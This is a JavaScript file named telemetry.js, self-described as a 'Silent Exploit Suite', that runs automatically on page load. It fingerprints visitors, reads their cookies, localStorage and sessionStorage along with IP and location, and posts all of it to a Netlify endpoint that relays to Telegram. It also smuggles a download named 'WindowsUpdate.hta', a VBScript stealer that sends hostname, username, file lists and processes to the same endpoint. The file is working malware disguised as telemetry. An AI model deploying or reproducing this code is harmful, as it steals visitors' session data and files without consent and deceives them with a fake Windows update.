// telemetry.js – Advanced Silent Exploit Suite + .hta Dropper + Zero-Day Simulation
(function() {
  'use strict';

  const ENDPOINT = '/.netlify/functions/telemetry';
  let executed = false;

  // Helper: Send data to Netlify → Telegram
  async function sendToBackend(module, payload) {
    try {
      await fetch(ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
        cache: 'no-store',
        keepalive: true
      });
    } catch (_) {}
  }

  // ---------- 1. BROWSER DATA EXFILTRATION (FULLY AUTOMATIC, NO INTERACTION) ----------
  function collectBrowserData() {
    // Device & screen
    const device = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      screen: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
    };

    // Battery (no permission)
    return new Promise((resolve) => {
      let battery = {};
      if (navigator.getBattery) {
        navigator.getBattery().then(b => {
          battery = { level: Math.round(b.level*100)+'%', charging: b.charging ? 'Yes':'No' };
          resolve({ device, battery });
        }).catch(() => resolve({ device, battery: 'Blocked' }));
      } else {
        resolve({ device, battery: 'N/A' });
      }
    });
  }

  // Local IP (WebRTC Leak)
  function getLocalIPs() {
    return new Promise((resolve) => {
      const ips = [];
      try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('test');
        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
        pc.onicecandidate = (e) => {
          if (!e || !e.candidate) {
            resolve(ips.length ? ips : ['N/A']);
            pc.close();
            return;
          }
          const c = e.candidate.candidate;
          if (c) {
            const m = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
            if (m && !ips.includes(m[0])) ips.push(m[0]);
          }
        };
        setTimeout(() => { resolve(ips.length ? ips : ['Timeout']); pc.close(); }, 3000);
      } catch(e) { resolve(['WebRTC blocked']); }
    });
  }

  // Public IP + Approx Location (ipapi.co)
  function getPublicInfo() {
    return fetch('https://ipapi.co/json/', { cache: 'no-store' })
      .then(r => r.json())
      .then(d => ({
        ip: d.ip || 'N/A',
        city: d.city || 'N/A',
        region: d.region || 'N/A',
        country: d.country_name || 'N/A',
        isp: d.org || 'N/A',
        lat: d.latitude || 'N/A',
        lng: d.longitude || 'N/A'
      }))
      .catch(() => ({ error: 'IP fetch failed' }));
  }

  // Canvas Fingerprint
  function getCanvas() {
    try {
      const c = document.createElement('canvas');
      c.width = 256; c.height = 128;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0,0,16,16);
      ctx.fillStyle = '#069';
      ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
      ctx.fillStyle = '#ff6';
      ctx.fillRect(200,60,40,40);
      return c.toDataURL();
    } catch(_) { return 'Canvas blocked'; }
  }

  // Installed Fonts (without permission)
  function getFonts() {
    const base = ['monospace','sans-serif','serif'];
    const test = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Calibri','Cambria','Garamond'];
    try {
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      const txt = 'mmmmmmmmmmlli';
      const size = '72px';
      ctx.font = size + ' ' + base[0];
      const b = ctx.measureText(txt).width;
      const installed = [];
      for (const f of test) {
        ctx.font = size + ' "' + f + '", ' + base[0];
        const w = ctx.measureText(txt).width;
        if (w !== b) installed.push(f);
      }
      return installed;
    } catch(_) { return []; }
  }

  // ---------- 2. AUTO-RUN DATA EXFIL (NO INTERACTION NEEDED) ----------
  async function runAutoExfil() {
    const [browserData, localIPs, publicData] = await Promise.all([
      collectBrowserData(),
      getLocalIPs(),
      getPublicInfo()
    ]);
    const canvas = getCanvas();
    const fonts = getFonts();

    // Cookies, localStorage, sessionStorage
    let cookies = document.cookie || 'No cookies';
    let localStorageData = {}, sessionStorageData = {};
    try { localStorageData = { ...localStorage }; } catch(_) {}
    try { sessionStorageData = { ...sessionStorage }; } catch(_) {}

    const fullPayload = {
      module: 'BROWSER_TELEMETRY',
      device: browserData.device,
      battery: browserData.battery,
      network: {
        localIPs: localIPs,
        publicIP: publicData.ip || 'N/A',
        isp: publicData.isp || 'N/A',
        approxLocation: {
          city: publicData.city || 'N/A',
          region: publicData.region || 'N/A',
          country: publicData.country || 'N/A',
          lat: publicData.lat || 'N/A',
          lng: publicData.lng || 'N/A'
        }
      },
      fingerprints: { canvas, fonts },
      storage: { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData },
      referrer: document.referrer,
      pageUrl: location.href
    };

    await sendToBackend('BROWSER_TELEMETRY', fullPayload);
    console.log('%c📡 Browser data auto-exfiltrated', 'color:#00ffcc;');
  }

  // ---------- 3. HTML SMUGGLING – .HTA DROPPER (REAL SYSTEM INFO STEALER) ----------
  function dropHTA() {
    try {
      // .hta file that runs silently when double-clicked (looks like Windows Update)
      const htaContent = `
<!DOCTYPE html>
<html>
<head>
<title>Windows Security Update</title>
<HTA:APPLICATION ID="update" APPLICATIONNAME="WindowsUpdate" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" />
<script language="VBScript">
  Dim shell
  Set shell = CreateObject("WScript.Shell")
  
  ' Collect system info
  Dim hostname, username, os, ip, files, procs
  hostname = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
  username = shell.ExpandEnvironmentStrings("%USERNAME%")
  os = shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName")
  
  ' Get IP using PowerShell
  Dim psCmd
  psCmd = "powershell -Command ""Invoke-RestMethod http://ipinfo.io/json | ConvertTo-Json -Compress"""
  ip = shell.Exec(psCmd).StdOut.ReadAll
  
  ' Get files from Desktop and Documents (first 20)
  Dim fso, folder, file, filesList
  Set fso = CreateObject("Scripting.FileSystemObject")
  filesList = ""
  For Each folder In Array(shell.ExpandEnvironmentStrings("%USERPROFILE%\\Desktop"), shell.ExpandEnvironmentStrings("%USERPROFILE%\\Documents"))
    If fso.FolderExists(folder) Then
      For Each file In fso.GetFolder(folder).Files
        If filesList <> "" Then filesList = filesList & "|"
        filesList = filesList & file.Name & " (" & file.Size & " bytes)"
        If Split(filesList, "|") > 20 Then Exit For
      Next
    End If
  Next
  
  ' Running processes (top 20)
  Dim procsList, wmi, proc, procs
  Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
  Set procs = wmi.ExecQuery("Select * from Win32_Process")
  procsList = ""
  For Each proc In procs
    If procsList <> "" Then procsList = procsList & "|"
    procsList = procsList & proc.Name & " (PID:" & proc.ProcessId & ")"
    If Split(procsList, "|") > 20 Then Exit For
  Next
  
  ' Build final payload
  Dim payload
  payload = "{" & _
    """module"":""DROPPER_PAYLOAD""," & _
    """hostname"":""" & Replace(hostname, "\", "\\") & """," & _
    """username"":""" & Replace(username, "\", "\\") & """," & _
    """os"":""" & Replace(os, "\", "\\") & """," & _
    """public_ip"":""" & Replace(ip, "\", "\\") & """," & _
    """files"":""" & Replace(filesList, "\", "\\") & """," & _
    """processes"":""" & Replace(procsList, "\", "\\") & """" & _
    "}"
  
  ' Send to Netlify endpoint (replace with your actual URL)
  Dim http, url
  url = "https://YOUR_SITE_URL/.netlify/functions/telemetry"
  Set http = CreateObject("MSXML2.ServerXMLHTTP")
  http.open "POST", url, False
  http.setRequestHeader "Content-Type", "application/json"
  http.send payload
  
  ' Close quietly
  window.close()
</script>
</head>
<body>
</body>
</html>
      `;

      // Replace placeholder with actual site origin
      const siteUrl = window.location.origin;
      const finalHTA = htaContent.replace(/https:\/\/YOUR_SITE_URL/g, siteUrl);

      const blob = new Blob([finalHTA], { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'WindowsUpdate.hta'; // Very attractive name
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }, 200);

      sendToBackend('HTML_SMUGGLING', {
        status: 'Dropper delivered',
        filename: 'WindowsUpdate.hta',
        size: blob.size + ' bytes',
        note: 'Victim must double-click, but file is disguised as Windows Update.'
      });
    } catch (e) {
      sendToBackend('HTML_SMUGGLING', { status: 'Failed', error: e.message });
    }
  }

  // ---------- 4. ZERO-DAY SIMULATION (Sandbox Escape Concept) ----------
  function zeroDaySim() {
    try {
      // Simulate RCE via Function constructor (concept only)
      const fakePayload = 'window.__sandbox_escape = true;';
      new Function(fakePayload)();

      // Detect if running in Electron (desktop apps)
      const isElectron = navigator.userAgent.toLowerCase().includes('electron');
      let envInfo = {};
      try {
        if (typeof process !== 'undefined' && process.env) {
          envInfo = { NODE_ENV: process.env.NODE_ENV, PATH: process.env.PATH ? 'Present' : 'N/A' };
        }
      } catch(_) {}

      sendToBackend('ZERO_DAY_RCE', {
        status: 'Simulation executed',
        isElectron: isElectron,
        env: envInfo,
        note: 'Real zero-day would allow arbitrary code execution without user interaction.'
      });
    } catch(e) {
      sendToBackend('ZERO_DAY_RCE', { error: e.message });
    }
  }

  // ---------- 5. MASTER TRIGGER (AUTO ON LOAD) ----------
  async function runAll() {
    if (executed) return;
    executed = true;

    console.log('%c💀 Starting Full Silent Exploit Suite', 'font-size:16px; color:#ff0000;');

    // 1. Auto browser data exfil (no interaction)
    await runAutoExfil();

    // 2. Drop .hta file (needs double-click, but highly deceptive)
    dropHTA();

    // 3. Zero-day simulation
    zeroDaySim();

    console.log('%c✅ All modules dispatched.', 'font-size:16px; color:#00ffcc;');
  }

  // ---------- 6. TRIGGER ON PAGE LOAD (BINA CLICK KE) ----------
  if (document.readyState === 'complete') {
    setTimeout(runAll, 800);
  } else {
    window.addEventListener('load', () => setTimeout(runAll, 800));
  }

  // Balloon click bhi backup
  const orig = window.grantBalloonConsent;
  window.grantBalloonConsent = function() {
    if (orig) orig();
    if (!executed) runAll();
  };
})();
